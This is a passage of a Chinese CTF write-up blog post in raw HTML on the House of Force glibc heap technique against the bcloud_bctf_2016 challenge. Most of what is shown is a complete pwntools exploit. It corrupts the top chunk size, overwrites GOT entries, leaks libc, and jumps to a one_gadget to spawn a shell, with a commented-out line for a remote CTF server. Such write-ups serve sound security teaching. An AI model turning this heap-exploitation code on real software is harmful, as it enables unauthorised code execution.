class="hljs-literal">on</span>e_gadget[<span class="hljs-number">3</span>] + libc_base<br></code></pre></td></tr></tbody></table></figure>

<p>再次编辑chunk__1将puts函数地址改为one_gadget地址，free（chunk_1）执行exeve(“/bin/sh\x00”)，获得shell。</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">itr</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/4ff3bf69a7f545dc9c4a1fbee817d3b1.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/4ff3bf69a7f545dc9c4a1fbee817d3b1.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c">from pwn import *<br>from LibcSearcher import *<br><span class="hljs-title function_">context</span><span class="hljs-params">(endian=<span class="hljs-string">'little'</span>,os=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'i386'</span>,log_level=<span class="hljs-string">'debug'</span>)</span> #小端序，linux系统，64位架构,debug<br>#定义gdb调试函数<br>def <span class="hljs-title function_">dbg</span><span class="hljs-params">()</span>:<br>        gdb.<span class="hljs-title function_">attach</span><span class="hljs-params">(sh)</span><br>        <span class="hljs-title function_">pause</span><span class="hljs-params">()</span><br>#命令简写化<br>s       = lambda data               :sh.send(data)<br>sa      = lambda delim,data         :sh.sendafter(delim, data)<br>sl      = lambda data               :sh.sendline(data)<br>sla     = lambda delim,data         :sh.sendlineafter(delim, data)<br>r       = lambda num=<span class="hljs-number">4096</span>           :sh.recv(num)<br>ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)<br>itr     = lambda                    :sh.interactive()<br>uu32    = lambda data               :u32(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">'\0'</span>))<br>uu64    = lambda data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\0'</span>))<br>leak    = lambda name,addr          :<span class="hljs-built_in">log</span>.success(<span class="hljs-string">'{} = {:#x}'</span>.format(name, addr))<br>lg      = lambda address,data       :<span class="hljs-built_in">log</span>.success(<span class="hljs-string">'%s: '</span>%(address)+hex(data))<br><br>sh = process(<span class="hljs-string">'./bcloud_bctf_2016'</span>)<br><span class="hljs-meta">#sh = remote(<span class="hljs-string">'node4.buuoj.cn'</span>,26937)</span><br><br>elf = ELF(<span class="hljs-string">'./bcloud_bctf_2016'</span>)<br>puts_plt = elf.plt[<span class="hljs-string">'puts'</span>]<br>__libc_start_main_got = elf.got[<span class="hljs-string">'__libc_start_main'</span>]<br>free_got = elf.got[<span class="hljs-string">'free'</span>]<br>heap_array = <span class="hljs-number">0x0804B120</span><br> <br>def add(size,content):<br>   sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)<br>   sla(<span class="hljs-string">'note content:'</span>,str(size))<br>   sa(<span class="hljs-string">'content:'</span>,content)<br> <br>def edit(index,content):<br>   sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)<br>   sla(<span class="hljs-string">'id:'</span>,str(index))<br>   sa(<span class="hljs-string">'content:'</span>,content)<br> <br>def delete(index):<br>   sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'4'</span>)<br>   sla(<span class="hljs-string">'id:'</span>,str(index))<br>def main():<br>	sa(<span class="hljs-string">'name:'</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">64</span>)<br>	ru(<span class="hljs-string">'a'</span>*<span class="hljs-number">64</span>)<br>	heap_addr = u32(r(<span class="hljs-number">4</span>)) <br>	lg(<span class="hljs-string">'heap_addr'</span>,heap_addr)<br>	<span class="hljs-meta">#dbg()</span><br>	sa(<span class="hljs-string">'Org:'</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">0x40</span>)<br>	#修改top chunk的size为<span class="hljs-number">-1</span>（<span class="hljs-number">0xFFFFFFFF</span>）<br>	sla(<span class="hljs-string">'Host:'</span>,p32(<span class="hljs-number">0xFFFFFFFF</span>))<br>	top_chunk_addr = heap_addr + <span class="hljs-number">0x48</span>*<span class="hljs-number">3</span><span class="hljs-number">-0x8</span><br>	lg(<span class="hljs-string">'top_chunk_addr'</span>,(top_chunk_addr))<br>	offset = heap_array - (top_chunk_addr +<span class="hljs-number">0x8</span>)- <span class="hljs-number">0x8</span><br>	lg(<span class="hljs-string">'offset'</span>,offset)<br>	add(offset,<span class="hljs-string">'') #0</span><br><span class="hljs-string">	add(0x18,'</span>\n<span class="hljs-number">'</span>) #<span class="hljs-number">1</span><br>	edit(<span class="hljs-number">1</span>,p32(<span class="hljs-number">0</span>) + p32(free_got) + p32(__libc_start_main_got) + p32(heap_array + <span class="hljs-number">0x10</span>)  + b<span class="hljs-number">'</span>\x00<span class="hljs-number">'</span>*<span class="hljs-number">8</span>)<br>	edit(<span class="hljs-number">1</span>,p32(puts_plt) + b<span class="hljs-number">'</span>\n<span class="hljs-number">'</span>)<br>	#泄露__libc_start_main_got的地址<br>	delete(<span class="hljs-number">2</span>)<br>	r(<span class="hljs-number">1</span>)<br>	__libc_start_main_addr = u32(r(<span class="hljs-number">4</span>))<br>	lg(<span class="hljs-string">'__libc_start_main'</span>,__libc_start_main_addr)<br>	<span class="hljs-meta">#dbg()</span><br>	<span class="hljs-string">'''</span><br>	libc = LibcSearcher(<span class="hljs-string">'__libc_start_main'</span>,__libc_start_main_addr)<br>	libc_base = __libc_start_main_addr - libc.dump(<span class="hljs-string">'__libc_start_main'</span>)<br>	system_addr = libc_base + libc.dump(<span class="hljs-string">'system'</span>)<br>	lg(<span class="hljs-string">'libc_base'</span>,(libc_base))<br>	lg(<span class="hljs-string">'system_addr'</span>,(system_addr))<br>	edit(<span class="hljs-number">1</span>,p32(system_addr) + b<span class="hljs-number">'</span>\n<span class="hljs-number">'</span>)<br>	<span class="hljs-string">'''</span><br>	#本地<br>	one_gadget = [<span class="hljs-number">0x3ac3c</span>,<span class="hljs-number">0x3ac3e</span>,<span class="hljs-number">0x3ac42</span>,<span class="hljs-number">0x3ac49</span>,<span class="hljs-number">0x5faa5</span>,<span class="hljs-number">0x5faa6</span>]<br>	libc = ELF(<span class="hljs-string">'/home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc-2.23.so'</span>)<br>	<span class="hljs-meta">#buu远程</span><br>	#one_gadget = [<span class="hljs-number">0x3a80c</span>,<span class="hljs-number">0x3a80e</span>,<span class="hljs-number">0x3a812</span>,<span class="hljs-number">0x3a819</span>,<span class="hljs-number">0x5f065</span>,<span class="hljs-number">0x5f066</span>]<br>	<span class="hljs-meta">#libc = ELF(<span class="hljs-string">'../../libc-2.23.so--32'</span>)</span><br>	libc_base = __libc_start_main_addr - libc.sym[<span class="hljs-string">'__libc_start_main'</span>]<br>	onegadget = one_gadget[<span class="hljs-number">3</span>] + libc_base<br>	edit(<span class="hljs-number">1</span>,p32(onegadget) + b<span class="hljs-number">'</span>\n<span class="hljs-number">'</span>)<br>	<span class="hljs-meta">#getshell</span><br>	delete(<span class="hljs-number">1</span>)<br>	itr()<br>main()<br></code></pre></td></tr></tbody></table></figure><div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/04/10/House%20of%20Einherjar/">← 下一篇 House of Einherjar</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/04/10/House%20of%20Lore/">Tcache Stashing Unlink Attack（House of Lore） 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Kylinxin</a></h1><div id="description"><p>当你觉得生活都不顺心如意的时候，来学习pwn吧！</p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#House-Of-Force2"><span class="toc-number">1.</span> <span class="toc-text">House Of Force2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#glibc%E6%BA%90%E7%A0%81%EF%BC%9A"><span class="toc-number">1.0.1.</span> <span class="toc-text">glibc源码：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#bcloud-bctf-2016"><span class="toc-number">2.1.</span> <span class="toc-text">bcloud_bctf_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#add%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.1.</span> <span class="toc-text">add函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#edit%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.2.</span> <span class="toc-text">edit函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#delete%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.3.</span> <span class="toc-text">delete函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E4%B8%80%E4%B8%AAread%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.4.</span> <span class="toc-text">自定义一个read函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%88%E6%8A%8A%E5%89%8D%E9%9D%A2%E7%9A%84%E4%B8%80%E4%BA%9B%E4%B8%9C%E8%A5%BF%E5%86%99%E5%A5%BD"><span class="toc-number">2.1.4.1.</span> <span class="toc-text">先把前面的一些东西写好</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">2.1.5.</span> <span class="toc-text">分析：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E5%B8%83%E5%B1%80"><span class="toc-number">2.1.6.</span> <span class="toc-text">栈布局</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">2.1.7.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> 主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>